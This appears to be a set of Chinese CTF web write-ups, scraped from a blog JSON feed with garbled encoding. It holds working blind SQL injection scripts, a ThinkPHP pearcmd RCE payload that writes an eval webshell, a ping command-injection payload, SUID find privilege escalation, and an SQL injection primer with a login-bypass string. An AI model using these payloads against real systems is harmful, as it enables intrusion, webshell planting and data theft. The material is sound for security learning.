è¿™é‡Œçš„&#x27;test&#x27;å³ä¸Šä¸€æ­¥çˆ†å‡ºçš„è¡¨å\n\nå‰é¢æˆ‘ä»¬æµ‹è¯•çš„å»¶æ—¶åœ¨4så·¦å³ï¼Œå»¶è¿Ÿè¿‡é•¿ï¼Œè¿™é‡Œé€‰æ‹©æ›´ç”¨md5(1)ï¼Œå°†å»¶æ—¶æ§åˆ¶åœ¨2så·¦å³ã€‚midå‡½æ•°èƒ½å¤Ÿè·å–çˆ†å‡ºçš„æ•°æ®çš„æ¯ä¸€ä¸ªå­—ç¬¦ï¼Œäºæ˜¯æˆ‘ä»¬å¯ä»¥äºŒåˆ†æŸ¥æ‰¾æ‰€æœ‰çš„å­—ç¬¦è¿›è¡Œéå†(è¿™é‡Œç”¨ASCIIç ä¸ºä»32åˆ°127çš„å­—ç¬¦é›†æ¥å®ç°)ï¼Œä¸ä¹‹ASCIIç å€¼è¿›è¡Œæ¯”å¯¹â€”â€”å½“i &lt; midæ—¶ï¼Œè¯´æ˜midæ‰¾å¤§äº†ï¼Œæ›´æ–°ä¸ºæœ€å¤§å€¼ä¸ºmidï¼›åä¹‹ï¼Œåˆ™æ›´æ–°æœ€å°å€¼ä¸ºmidã€‚midæ›´æ–°çš„å®ç°åªéœ€è¦æ¯æ¬¡è¿›è¡Œrequestè¿æ¥ï¼Œå¹¶è®¾ç½®è¶…æ—¶æ—¶é—´ã€‚å½“è¶…æ—¶æ—¶ï¼Œè¯´æ˜i &lt; midï¼Œè§¦å‘äº†benchmark.\næ ¹æ®ä¸Šé¢çš„åˆ†æï¼Œæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨SQLè¯­å¥èƒ½å¤Ÿåœ¨insertè¯­å¥ä¸­è¢«æ‰§è¡Œçš„ç‰¹ç‚¹ï¼Œæ„é€ POC. \nimport requestsimport timeurl = &quot;http://20351089-cacb-4fea-a68f-feb330422825.node4.buuoj.cn:81/&quot;flag = &#x27;&#x27;for i in range(1, 50):    m = 32    n = 127    while 1:        mid = (m + n) // 2        # payload=&quot;0&#x27;or(if((ascii(mid((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),&#123;&#125;,1))&lt;&#123;&#125;),benchmark(2000000,md5(1)),0))or&#x27;&quot;.format(i,mid) #flaggg,user        # payload=&quot;0&#x27;or(if((ascii(mid((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;flaggg&#x27;)),&#123;&#125;,1))&lt;&#123;&#125;),benchmark(2000000,md5(1)),0))or&#x27;&quot;.format(i,mid) #cmd        payload = &quot;0&#x27;or(if((ascii(mid((select(cmd)from(flaggg)),&#123;&#125;,1))&lt;&#123;&#125;),benchmark(2000000,md5(1)),0))or&#x27;&quot;.format(i, mid)        data = &#123;            &#x27;username&#x27;: payload,            &#x27;password&#x27;: &#x27;123456&#x27;        &#125;        # print(data)        try:            r = requests.post(url=url, data=data, timeout=1.5)            m = mid        except:            n = mid        if (m + 1 == n):            flag += chr(m)            print(flag)            break        time.sleep(0.2)    time.sleep(1)\n\nå¦‚ä¸Šå°±æ˜¯ä¸€é“ç›²æ³¨é¢˜çš„å®Œæ•´æ€è·¯ï¼Œæˆ–å¯ä½œä¸ºå­¦ä¹ SQLæ³¨å…¥çš„åŸºç¡€çŸ¥è¯†çš„ä¸€éƒ¨åˆ†æ¥çœ‹ã€‚å…³äºæœ€å¤§è¶…æ—¶æ—¶é—´çš„è®¾ç½®å’Œbenchmarkçš„æ‰§è¡Œæ¬¡æ•°éœ€è¦æ ¹æ®å®é™…æµ‹è¯•æƒ…å†µè¿›è¡Œè°ƒæ•´ï¼Œä¸ç½‘é€Ÿæœ‰ç€å…³ç³»ï¼Œè¿™å¯èƒ½å¯¼è‡´è·‘å‡ºæ¥çš„ç»“æœæœ‰è¯¯å·®ï¼Œæœ‰æ²¡æœ‰å‡å°è¯¯å·®çš„åŠæ³•å‘¢ï¼Ÿ\neasysqlä¸ä¸Šé¢˜å‡ ä¹æ²¡æœ‰ä»€ä¹ˆä¸åŒï¼ŒåŒºåˆ«åœ¨äºå¤šè¿‡æ»¤äº†&lt;å’Œ&gt;ï¼ˆè™½ç„¶æˆ‘ä¹Ÿä¸çŸ¥é“æ€ä¹ˆçœ‹å‡ºæ¥å¤šè¿‡æ»¤äº†è¿™ä¿©ç©æ„å„¿ï¼ŒHintè²Œä¼¼æ²¡ç»™ï¼‰ï¼Œå› æ­¤æ— æ³•å†ç”¨äºŒåˆ†æ³•ï¼Œæ”¹ç”¨=å³å¯ã€‚æ„é€ POCå¦‚ä¸‹ï¼š\nimport requestsimport timeurl = &quot;http://983f9517-713d-4041-8c6d-d3dc94e57452.node4.buuoj.cn:81/&quot;flag = &#x27;&#x27;for i in range(1, 50):    a = 0    for j in range(128, 32, -1):        # payload=&quot;0&#x27;or(if((ascii(mid((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),&#123;&#125;,1))=&#123;&#125;),benchmark(2000000,md5(1)),0))or&#x27;&quot;.format(i,j) #flaggg,user        # payload=&quot;0&#x27;or(if((ascii(mid((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;flaggg&#x27;)),&#123;&#125;,1))=&#123;&#125;),benchmark(2000000,md5(1)),0))or&#x27;&quot;.format(i,j) #cmd        payload = &quot;0&#x27;or(if((ascii(mid((select(cmd)from(flaggg)),&#123;&#125;,1))=&#123;&#125;),benchmark(2000000,md5(1)),0))or&#x27;&quot;.format(i, j)        data = &#123;            &#x27;username&#x27;: &#x27;a&#x27;,            &#x27;password&#x27;: payload        &#125;        # print(data)        try:            r = requests.post(url=url, data=data, timeout=1.5)        except:            flag += chr(j)            print(flag)            break        if (j == 33):            a = 1        time.sleep(0.5)    if (a == 1):        print(flag)        break    time.sleep(1)\n\n\n\nNodeSoEasyPharPOPè€ƒç‚¹åœ¨äºpharååºåˆ—åŒ–ï¼Œé¢˜ç›®ç»™å‡ºæºç \n&lt;?phphighlight_file(__FILE__);function waf($data)&#123;    if (is_array($data))&#123;        die(&quot;Cannot transfer arrays&quot;);    &#125;    if (preg_match(&#x27;/get|air|tree|apple|banana|php|filter|base64|rot13|read|data/i&#x27;, $data)) &#123;        die(&quot;You can&#x27;t do&quot;);    &#125;&#125;class air&#123;    public $p;    public function __set($p, $value) &#123;        $p = $this-&gt;p-&gt;act;        echo new $p($value);                    // 4.ä»»æ„ç±»ï¼Œæœ€ç»ˆåˆ©ç”¨ç‚¹    &#125;&#125;class tree&#123;    public $name;    public $act;    public function __destruct() &#123;        return $this-&gt;name();                   // 1.è§¦å‘ tree çš„ _call æ–¹æ³•    &#125;    public function __call($name, $arg)&#123;        $arg[1] =$this-&gt;name-&gt;$name;            // 2.è§¦å‘ apple çš„ _get æ–¹æ³•    &#125;&#125;class apple &#123;    public $xxx;    public $flag;    public function __get($flag)    &#123;        $this-&gt;xxx-&gt;$flag = $this-&gt;flag;        // 3.è§¦å‘ air çš„ _set æ–¹æ³•    &#125;&#125;class D &#123;    public $start;    public function __destruct()&#123;        $data = $_POST[0];        if ($this-&gt;start == &#x27;w&#x27;) &#123;            waf($data);            $filename = &quot;/tmp/&quot;.md5(rand()).&quot;.jpg&quot;;            file_put_contents($filename, $data);            echo $filename;        &#125; else if ($this-&gt;start == &#x27;r&#x27;) &#123;            waf($data);            $f = file_get_contents($data);            if($f)&#123;                echo &quot;It is file&quot;;            &#125;            else&#123;                echo &quot;You can look at the others&quot;;            &#125;        &#125;    &#125;&#125;class banana &#123;    public function __get($name)&#123;        return $this-&gt;$name;    &#125;&#125;// flag in /if(strlen($_POST[1]) &lt; 55) &#123;    $a = unserialize($_POST[1]);&#125;else&#123;    echo &quot;str too long&quot;;&#125;throw new Error(&quot;start&quot;);?&gt;\n\nè§£é¢˜æ€è·¯åˆ—å‡ºå‡ ä¸ªåˆ†æPOPé“¾å¸¸ç”¨çš„é­”æœ¯æ–¹æ³•\n__construct()  //å½“å¯¹è±¡åˆ›å»ºæ—¶è§¦å‘__destruct()   //å½“å¯¹è±¡é”€æ¯æ—¶è§¦å‘__wakeup()     //å½“ä½¿ç”¨unserializeæ—¶è§¦å‘__sleep()     //å½“ä½¿ç”¨serializeæ—¶è§¦å‘__call()      //å½“å¯¹è±¡ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘__get()       //å½“è®¿é—®ä¸å¯è®¿é—®æˆ–ä¸å­˜åœ¨çš„å±æ€§æ—¶è§¦å‘__set()       //å½“è®¾ç½®ä¸å¯è®¿é—®æˆ–ä¸å­˜åœ¨å±æ€§æ—¶è§¦å‘__toString()  //å½“æŠŠç±»å½“ä½œå­—ç¬¦ä¸²ä½¿ç”¨æ—¶è§¦å‘__invoke()    //å½“å¯¹è±¡è°ƒç”¨ä¸ºå‡½æ•°æ—¶è§¦å‘\n\nå®¡è®¡æºç æ‰¾å‡ºä¸€æ¡å¯åˆ©ç”¨çš„é“¾å­\ntree::_destruct() =&gt; tree::_call() =&gt; apple::_get() =&gt; air::_set() =&gt;  åŸç”Ÿç±»\n\n\n","categories":["Write Up"],"tags":["CTF","web"]},{"title":"2023TimeKeeper-X-HashTeam","url":"/2023/04/09/2023TimeKeeper-X-HashTeam/","content":"é¢˜ç›®åœ°å€\nWebç­¾åˆ°-è¿è¿çœ‹åœ¨å‰ç«¯ä¸­æ‰¾åˆ°ç–‘ä¼¼flagçš„å­—ç¬¦ä¸²ï¼š\n\n\n&quot;\\x54\\x4b\\x48\\x41\\x53\\x48\\x7b\\x57\\x65\\x31\\x63\\x34\\x6d\\x33\\x5f\\x54\\x30\\x5f\\x54\\x4b\\x2a\\x48\\x41\\x53\\x48\\x5f\\x43\\x54\\x46\\x5f\\x33\\x6e\\x6a\\x30\\x79\\x5f\\x31\\x74\\x7d&quot;\n\nè¾“å‡ºå³æ‹¿åˆ°FLAGï¼š\nTKHASH&#123;We1c4m3_T0_TK*HASH_CTF_3nj0y_1t&#125;\n\nthinké¢˜ç›®ç»™å‡ºæç¤ºâ€œthinkphpæ˜¯å¾ˆå¥½çš„phpå¼€å‘æ¡†æ¶ï¼Œå°çŒªçŒªå°¤å…¶å–œæ¬¢å®ƒçš„å¤šè¯­è¨€åŠŸèƒ½â€ã€‚æ”¾æœç´¢å¼•æ“å®¹æ˜“æŸ¥åˆ°ThinkPHP å¤šè¯­è¨€æ¨¡å—RCEæ¼æ´ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡ getã€headerã€cookie ç­‰ä½ç½®ä¼ å…¥å‚æ•°ï¼Œå®ç°ç›®å½•ç©¿è¶Š+æ–‡ä»¶åŒ…å«ï¼Œé€šè¿‡ pearcmd æ–‡ä»¶åŒ…å«è¿™ä¸ª trick å³å¯å®ç° RCEã€‚\nç»™å‡ºexpå¦‚ä¸‹ï¼š\n?lang=../../../../../../../../usr/local/lib/php/pearcmd&amp;+config-create+/&lt;?=@eval($_POST[&#x27;new&#x27;]);?&gt;+/var/www/html/new.php\n\nå€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œå¦‚æœç›´æ¥ä¼ å…¥langä¼šå¯¼è‡´&lt;,&#39;,&gt;è¢«ç¼–ç ï¼Œä»è€Œæ— æ³•è¢«è§£æï¼Œå¦‚ä¸‹å›¾ï¼š\n\n\n\nå› æ­¤éœ€è¦å€ŸåŠ©BurpSuiteæŠ“åŒ…ï¼Œå¯¹è¯·æ±‚åŒ…åšä¸€ä¸‹ä¿®æ”¹ã€‚ä¹‹åæˆåŠŸä¸Šä¼ ï¼Œä¸”è·¯å¾„ç»™å‡ºï¼Œå³å¯ç”¨èšå‰‘è¿æ¥ï¼Œæ‹¿åˆ°flag.\n\n\nTKHASH&#123;ggb0nd_l1k3s_e4t1ng_loll1p0p&#125;\n\n\nèµ„æ–™ï¼šThinkPHP å¤šè¯­è¨€æ¨¡å—RCEæ¼æ´å¤ç°\n\nnew friendsä¸€é“æ–‡ä»¶ä¸Šä¼ é¢˜ç›®ï¼Œåªèƒ½ä¸Šä¼ .pngåç¼€çš„æ–‡ä»¶ï¼Œä¸”å‰åç«¯éƒ½æœ‰è¿‡æ»¤ï¼Œæ— æ³•ç›´æ¥å¯¹åç¼€ä¿®æ”¹æˆ–ä¸Šä¼ .htaccessé…ç½®æ–‡ä»¶ä¿®æ”¹æ–‡ä»¶è§£ææ–¹å¼ã€‚\nè¿™é‡Œå…ˆæŠŠå…ˆå°†ä¸€å¥è¯æœ¨é©¬æ”¹æˆ.pngåç¼€ï¼ŒæˆåŠŸä¸Šä¼ webshell.pngã€‚å¹¶ä¸”å‘Šè¯‰æˆ‘ä»¬ä¸Šä¼ æ–‡ä»¶å¤¹åœ¨/uploadsã€‚\næ¥ä¸‹æ¥è¯•ç€å¯¹pingåŠŸèƒ½ä¸‹æ‰‹ã€‚æˆ‘ä»¬çŸ¥é“pingä¸»æœºåœ¨æœåŠ¡å™¨ä¸Šçš„å®ç°å¦‚ä¸‹:\nping 0.0.0.0\n\nå¦‚æœæ˜¯ï¼ˆå€ŸåŠ©;åˆ†éš”ä¸¤æ¡å‘½ä»¤ï¼‰\nping 0.0.0.0;ls\n\nå°±å¯ä»¥å®ç°pingå’Œlsä¸¤æ¡å‘½ä»¤çš„å…ˆåæ‰§è¡Œã€‚è¿™é‡Œè¿›è¡Œå°è¯•ï¼Œç»“æœå¦‚ä¸‹ï¼š\n\n\nå¯ä»¥çœ‹åˆ°ï¼Œlså‘½ä»¤æˆåŠŸæ‰§è¡Œï¼Œå¹¶ä¸”æ‰¾åˆ°äº†æˆ‘ä»¬uploadsæ–‡ä»¶å¤¹ï¼Œä¸‹ä¸€æ­¥åªéœ€å€ŸåŠ©mvå‘½ä»¤å¯¹webshell.pngé‡å‘½åå³å¯ï¼Œpayloadå¦‚ä¸‹ï¼š\n0;cd uploads;mv webshell.png webshell.php\n\n\nwebshell.pngé‡å‘½åæˆåŠŸï¼Œä¸‹ä¸€æ­¥ç”¨èšå‰‘è¿æ¥ï¼Œå¯»æ‰¾åˆ°flagï¼Œä½†æ˜¯å› ä¸ºæƒé™ä¸å¤Ÿï¼Œæ— æ³•æ‰“å¼€è¯¥æ–‡ä»¶ï¼Œéœ€è¦ææƒã€‚\nLinuxä¸‹SUIDææƒæ–¹æ³•ï¼šSUIDå¯ä»¥è®©è°ƒç”¨è€…ä»¥æ–‡ä»¶æ‹¥æœ‰è€…çš„èº«ä»½è¿è¡Œè¯¥æ–‡ä»¶ï¼Œæ‰€ä»¥æˆ‘ä»¬åˆ©ç”¨SUIDææƒçš„æ€è·¯å°±æ˜¯è¿è¡Œrootç”¨æˆ·æ‰€æ‹¥æœ‰çš„SUIDçš„æ–‡ä»¶ï¼Œé‚£ä¹ˆæˆ‘ä»¬è¿è¡Œè¯¥æ–‡ä»¶çš„æ—¶å€™å°±å¾—è·å¾—rootç”¨æˆ·çš„èº«ä»½äº†ã€‚å·²çŸ¥çš„å¯ç”¨æ¥ææƒçš„linuxå¯è¡Œæ€§çš„æ–‡ä»¶åˆ—è¡¨å¦‚ä¸‹ï¼š\nnmapvimfindbashmorelessnanocp\n\næ­¤æ—¶ï¼Œæˆ‘ä»¬é¦–å…ˆç”¨å¦‚ä¸‹å‘½ä»¤æŸ¥çœ‹å…·æœ‰rootç”¨æˆ·æƒé™çš„SUIDæ–‡ä»¶\nfind / -perm -u=s -type f 2&gt;/dev/null\n\nå‘ç°findæ–‡ä»¶æ°å¥½æ˜¯ä»¥suidæƒé™è¿è¡Œï¼Œç»§ç»­æŸ¥çœ‹findçš„ä¿¡æ¯ï¼Œç¡®å®æ˜¯rootæƒé™çš„suidæ–‡ä»¶(å«s)\n\n\näºæ˜¯é€šè¿‡findæ‰§è¡Œçš„æ‰€æœ‰å‘½ä»¤éƒ½ä¼šä»¥rootæƒé™æ‰§è¡Œã€‚\næ¥ä¸‹æ¥æˆ‘ä»¬ç”¨findè¿›è¡Œæƒé™æå‡ï¼Œæ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼Œå°†ä¼šæ˜¾ç¤ºroot\n/usr/bin/find ç³»ç»Ÿä¸­ä»»æ„å­˜åœ¨çš„æ–‡ä»¶å -exec å‘½ä»¤ \\;      //æ³¨: \\;æ˜¯-execé€‰é¡¹çš„å‚æ•°\n\nç„¶åè¯»å–flagå³å¯ï¼š\n/usr/bin/find flag -exec cat flag \\;\n\næ‹¿åˆ°flagï¼š\nTKHASH&#123;h1ll0_m1_new_fr1ends&#125;\n\n\nèµ„æ–™ï¼šLinuxææƒ:åˆ©ç”¨SUIDææƒ\n\n","categories":["Write Up"],"tags":["CTF","web"]},{"title":"SQLæ³¨å…¥","url":"/2022/12/15/SQL%E6%B3%A8%E5%85%A5/","content":"SQLæ³¨å…¥åŸç†SQLæ³¨å…¥äº§ç”Ÿçš„åŸå› å½“Webåº”ç”¨å‘åå°æ•°æ®åº“ä¼ é€’SQLè¯­å¥è¿›è¡Œæ•°æ®åº“æ“ä½œæ—¶ï¼Œå¦‚æœç”¨æˆ·è¾“å…¥çš„å‚æ•°æ²¡æœ‰ç»è¿‡ä¸¥æ ¼çš„è¿‡æ»¤å¤„ç†ï¼Œé‚£ä¹ˆæ”»å‡»è€…å°±å¯ä»¥æ„é€ ç‰¹æ®Šçš„SQLè¯­å¥ï¼Œç›´æ¥è¾“å…¥æ•°æ®åº“å¼•æ“æ‰§è¡Œï¼Œè·å–æˆ–ä¿®æ”¹æ•°æ®åº“ä¸­çš„æ•°æ®ã€‚\nSQLæ³¨å…¥çš„æœ¬è´¨æŠŠç”¨æˆ·è¾“å…¥çš„æ•°æ®å½“ä½œä»£ç æ¥æ‰§è¡Œï¼Œè¿èƒŒäº†â€œæ•°æ®ä¸ä»£ç åˆ†ç¦»â€çš„åŸåˆ™ã€‚\nSQLæ³¨å…¥çš„å…³é”®ç‚¹\nç”¨æˆ·èƒ½å¤Ÿæ§åˆ¶è¾“å…¥çš„å†…å®¹ï¼›\nWebåº”ç”¨æŠŠç”¨æˆ·è¾“å…¥çš„å†…å®¹å¸¦åˆ°æ•°æ®åº“ä¸­æ‰§è¡Œ\n\nSQLæ³¨å…¥çš„å±å®³\nç›—å–ç½‘ç«™çš„æ•æ„Ÿä¿¡æ¯\nç»•è¿‡åå°è®¤è¯åå°ç™»å½•è¯­å¥select * from admin where username = &#x27;admin&#x27; and password = &#x27;password&#x27;ä¸‡èƒ½å¯†ç &#x27; or &#x27;1&#x27; = &#x27;1&#x27; #\nå€ŸåŠ©SQLæ³¨å…¥æ¼æ´ææƒè·å–ç³»ç»Ÿæƒé™\nè¯»å–æ–‡ä»¶ä¿¡æ¯\n\nSQLæ³¨å…¥çš„åˆ†ç±»\næ ¹æ®è¯¸å¦‚ä½ç½®åˆ†ç±»ï¼šGETå‹ã€POSTå‹ã€Headå¤´æ³¨å…¥\n\næ ¹æ®åé¦ˆç»“æœåˆ†ç±»ï¼šæœ‰å›æ˜¾ã€æ— å›æ˜¾\n â… . æœ‰å›æ˜¾\n\nå¯ä»¥è”åˆæŸ¥è¯¢çš„æ³¨å…¥\næŠ¥é”™æ³¨å…¥\né€šè¿‡æ³¨å…¥è¿›è¡ŒDNSè¯·æ±‚ï¼Œä»è€Œè¾¾åˆ°å¯å›æ˜¾çš„ç›®çš„\n\n â…¡. æ— å›æ˜¾\n\nBoolç›²æ³¨\næ—¶é—´ç›²æ³¨\n\n\næ ¹æ®æ•°æ®ç±»å‹åˆ†ç±»ï¼šæ•°å­—å‹ï¼ˆè¾“å…¥çš„å‚æ•°ä¸ºæ•´å‹ï¼Œå¦‚idã€å¹´é¾„ã€é¡µç ç­‰ï¼‰ï¼Œå­—ç¬¦å‹ï¼ˆè¾“å…¥çš„å‚æ•°ä¸ºå­—ç¬¦ä¸²ï¼‰\n\n\næ•°å­—å‹ä¸å­—ç¬¦å‹æœ€å¤§çš„åŒºåˆ«åœ¨äºï¼šæ•°å­—å‹ä¸éœ€è¦å•å¼•å·é—­åˆï¼Œè€Œå­—ç¬¦å‹ä¸€èˆ¬éœ€è¦å•å¼•å·é—­åˆã€‚\nå¦å¤–è¿˜éœ€æ³¨æ„äºŒæ¬¡æ³¨å…¥ï¼Œä¸€èˆ¬éœ€è¦è‡ªå·±ç¼–å†™ä»£ç ä»¥å®ç°è‡ªåŠ¨åŒ–æ³¨å…¥ã€‚\nSQLæ³¨å…¥çš„æµç¨‹æ³¨å…¥ç‚¹çš„ä½ç½®åŠå‘ç°SQLæ³¨å…¥éœ€è¦å¯»æ‰¾ä¸æ•°æ®åº“æœ‰å…³è”çš„è¯·æ±‚ã€‚å¸¸è§çš„æ³¨å…¥ç‚¹ä¸ä¸€å®šæ˜¯è¡¨å•ä¸­çš„usernameå­—æ®µï¼Œæœ‰æ—¶å€™æ³¨å…¥ç‚¹è¿˜ä¼šéšè—åœ¨ä¸åŒçš„åœ°æ–¹ï¼Œä¸‹é¢æˆ‘ä»¬æ¥ä»‹ç»å‡ ä¸ªå¸¸è§çš„æ³¨å…¥ç‚¹çš„ä½ç½®ã€‚\n\nGETå‚æ•°ä¸­çš„æ³¨å…¥ï¼šGETä¸­çš„æ³¨å…¥ç‚¹ä¸€èˆ¬æœ€å®¹æ˜“å‘ç°ï¼Œå› ä¸ºæˆ‘ä»¬å¯ä»¥åœ¨åœ°å€æ è·å–URLå’Œå‚æ•°ç­‰ï¼Œå¯ä»¥ç”¨Sqlmapæˆ–è€…æ‰‹å·¥éªŒè¯æ˜¯å¦å­˜åœ¨æ³¨å…¥ã€‚\nPOSTä¸­çš„æ³¨å…¥ï¼šPOSTä¸­çš„æ³¨å…¥ç‚¹ä¸€èˆ¬éœ€è¦æˆ‘ä»¬é€šè¿‡æŠ“åŒ…æ“ä½œæ¥å‘ç°ï¼Œå¦‚ä½¿ç”¨Burpæˆ–Hackbaræ¥å‘é€POSTåŒ…ã€‚åŒæ ·ä¹Ÿå¯ä»¥ä½¿ç”¨Sqlmapæˆ–è€…æ‰‹å·¥éªŒè¯ã€‚\nUser-Agentä¸­çš„æ³¨å…¥ï¼šåœ¨å¸Œæœ›å‘ç°User-Agentä¸­çš„æ³¨å…¥æ—¶ï¼Œå¯ä»¥ä½¿ç”¨Burpä¸­çš„Repeateræ¨¡å—ï¼Œæˆ–è€…Sqlmapã€‚å°†Sqlmapçš„å‚æ•°è®¾ç½®ä¸ºï¼šlevel=3ï¼Œè¿™æ ·Sqlmapä¼šè‡ªåŠ¨æ£€æµ‹User-Agentä¸­æ˜¯å¦å­˜åœ¨æ³¨å…¥ã€‚\nCookieä¸­çš„æ³¨å…¥ï¼šæƒ³è¦å‘ç°Cookieä¸­çš„æ³¨å…¥ï¼Œ å¯ä»¥ä½¿ç”¨Burpä¸­çš„Repeateræ¨¡å—ï¼Œæˆ–è€…Sqlmapã€‚å°†Sqlmapçš„å‚æ•°è®¾ç½®ä¸ºï¼šlevel=2ï¼Œè¿™æ ·Sqlmapä¼šè‡ªåŠ¨æ£€æµ‹Cookieä¸­ä¸­æ˜¯å¦å­˜åœ¨æ³¨å…¥ã€‚\n\nåˆ¤è¯»æ³¨å…¥ç‚¹æ˜¯å¦å­˜åœ¨åœ¨åˆ¤æ–­è¾“å…¥ç‚¹æ˜¯å¦å­˜åœ¨æ³¨å…¥æ—¶ï¼Œå¯ä»¥å…ˆå‡è®¾åŸç¨‹åºæ‰§è¡Œçš„SQLè¯­å¥ï¼Œå¦‚\nSELECT UserName FROM User WHERE id = &#x27;$id&#x27;;    // å‚æ•°ä¸ºå­—ç¬¦ä¸²æˆ–SELECT UserName FROM User WHERE id = $id;   // å‚æ•°ä¸ºæ•°å­—\n\nç„¶åé€šè¿‡ä»¥ä¸‹å‡ ç§æ–¹æ³•è¿›è¡Œåˆ¤æ–­ï¼š\n\næ’å…¥å•å¼•å·ï¼šæ’å…¥å•å¼•å·æ˜¯æˆ‘ä»¬æœ€å¸¸ç”¨çš„æ£€æµ‹åŠæ³•ï¼ŒåŸç†åœ¨äºæœªé—­åˆçš„å•å¼•å·ä¼šå¼•èµ·SQLè¯­å¥å•å¼•å·æœªé—­åˆçš„é”™è¯¯\næ•°å­—å‹åˆ¤æ–­ï¼šé€šè¿‡ or 1=1 ï¼ˆæ•°å­—å‹ï¼‰å’Œé—­åˆå•å¼•å·çš„æµ‹è¯•è¯­å¥ &#39;or &#39;1&#39;=&#39;1 è¿›è¡Œåˆ¤æ–­ï¼Œè¿™é‡Œé‡‡ç”¨Payload &#39;1&#39;=&#39;1 çš„ç›®çš„æ˜¯é—­åˆåŸè¯­å¥åæ–¹çš„å•å¼•å·ï¼Œä¹Ÿå¯ä»¥é€‰æ‹©&#39;1&#39;=&#39;1&#39;#æ³¨é‡Šæ‰åé¢çš„å•å¼•å·\né€šè¿‡æ•°å­—çš„åŠ å‡åˆ¤æ–­ï¼šæ¯”å¦‚ï¼Œæˆ‘ä»¬åœ¨é‡åˆ°çš„é¢˜ç›®ä¸­æŠ“åˆ°äº†é“¾æ¥ http://example.com/?id=2 å°±å¯ä»¥è¿›è¡Œå¦‚ä¸‹çš„å°è¯• http://example.com/?id=3-1 . å¦‚æœäºŒè€…ç»“æœç›¸åŒï¼Œåˆ™è¯æ˜idè¿™ä¸ªè¾“å…¥ç‚¹å¯èƒ½å­˜åœ¨SQLæ³¨å…¥æ¼æ´\n\n*åˆ¤æ–­é—­åˆæ–¹å¼?id=1cccc\n\næœ‰æŠ¥é”™ï¼šæ•°å­—å‹ï¼Œæ— é—­åˆæˆ–ç”¨ ) é—­åˆ\næ— æŠ¥é”™ï¼šå­—ç¬¦å‹ï¼Œå†ç”¨ï¼š &#39; , &quot; , &#39;) , &quot;) æ ¹æ®æŠ¥é”™ä¿¡æ¯åˆ¤æ–­\nåˆ¤æ–­å­—æ®µæ•°ï¼ˆåˆ—æ•°ï¼‰åŠå›æ˜¾ä½?id=1&#x27; order by 3#?id=1&#x27; order by 2#\nåˆ©ç”¨SQLçš„ç‰¹æ€§ï¼Œå½“æŸ¥è¯¢æ—¶order byåçš„æ•°å­—å¤§äºåˆ—æ•°æ—¶å°±ä¼šæŠ¥é”™ï¼Œæ ¹æ®è¿™ä¸€ç‚¹å¯åˆ¤æ–­åˆ—æ•°ï¼ˆå€ŸåŠ©äºŒåˆ†æ³•å¯å¿«é€Ÿåˆ¤æ–­ï¼‰\n\n\norder by 3æ—¶æŠ¥é”™ï¼Œorder by 2æ—¶ä¸æŠ¥é”™ï¼Œè¡¨åä¸ºä¸¤ä¸ªå­—æ®µã€‚\n\n\nUNION è”åˆæŸ¥è¯¢UNIONå…³é”®å­—ï¼Œè”åˆæŸ¥è¯¢ï¼Œå¯ä»¥å®ç°å°†ä¸¤ä¸ªselectè¯­å¥åˆå¹¶ä¸ºä¸€æ¡è¯­å¥ï¼Œå¹¶æ˜¾ç¤ºä¸ºä¸€ä¸ªç»“æœã€‚\n\n\néœ€è¦æ³¨æ„ï¼Œè”åˆæŸ¥è¯¢ä¸‹ï¼Œä¸¤ä¸ªselectè¯­å¥æ‰€æŸ¥è¯¢çš„è¡¨ä¸€å®šä¸ºç›¸åŒå­—æ®µæ•°é‡ï¼\nMySQLåŸºç¡€æŸ¥è¯¢è¯­æ³•å‘Šè¯‰æˆ‘ä»¬æŸ¥è¯¢ç³»ç»Ÿå½“å‰ä½¿ç”¨çš„æ•°æ®åº“åç§°çš„æ–¹æ³•ï¼š\nselect database();  // æŸ¥è¯¢æŸ¥è¯¢å½“å‰æ•°æ®åº“åç§°\n\nè€Œå¦‚æœåŸ¹è®­å’Œunionè”åˆæŸ¥è¯¢ï¼Œå¿…é¡»æ„é€ ç›¸åŒå­—æ®µæ•°ï¼š\nselect 1, database();   // ä¸¤ä¸ªå­—æ®µselect 1, 2, database();    // ä¸‰ä¸ªå­—æ®µ\n\n\n\nåˆ©ç”¨è¿™ä¸€ç‚¹ï¼Œå¯ä»¥è”åˆæŸ¥è¯¢å‡ºæ•°æ®åº“åï¼š\n\n\nå¹¶ä¸”å¯ä»¥çŸ¥é“ï¼Œç¬¬ä¸€ä¸ªå­—æ®µçš„å€¼å°†ä¼šæ˜¾ç¤ºåœ¨First nameå¤„ï¼Œç¬¬äºŒä¸ªå­—æ®µçš„å€¼å°†ä¼šæ˜¾ç¤ºåœ¨Surnameå¤„ã€‚\næ¥ä¸‹æ¥æˆ‘ä»¬éœ€è¦æŸ¥è¯¢æ•°æ®åº“çš„è¡¨æœ‰ä»€ä¹ˆå†…å®¹ï¼Œè¿™å°†ä¼šåˆ©ç”¨è¿™ä¸ªè‡ªå¸¦çš„æ•°æ®åº“æ¥æŸ¥è¯¢è¡¨åâ€”â€” information_schema , åœ¨è¯¥æ•°æ®åº“ä¸­å­˜åœ¨ tables è¡¨ï¼Œ æä¾›äº†å…³äºæ•°æ®åº“ä¸­çš„è¡¨çš„ä¿¡æ¯ï¼ˆåŒ…æ‹¬è§†å›¾ï¼‰ã€‚è¯¦ç»†è¡¨è¿°äº†æŸä¸ªè¡¨å±äºå“ªä¸ªschemaï¼Œè¡¨ç±»å‹ï¼Œè¡¨å¼•æ“ï¼Œåˆ›å»ºæ—¶é—´ç­‰ä¿¡æ¯ã€‚\nselect id from test.students;    //è·¨æ•°æ®åº“æŸ¥è¯¢teståº“ä¸­çš„studentsè¡¨çš„idå­—æ®µ(åªæ˜¾ç¤ºidè¿™ä¸€åˆ—)select table_name from information_schema.tables; //æŸ¥è¯¢æ‰€æœ‰çš„è¡¨åselect table_name from information_schema.tables where table_schema=&#x27;dvwa&#x27;;    //æŸ¥è¯¢æ•°æ®åº“dvwaçš„ä¸­çš„æ‰€æœ‰è¡¨å\n\nç”±æ­¤æ„é€ 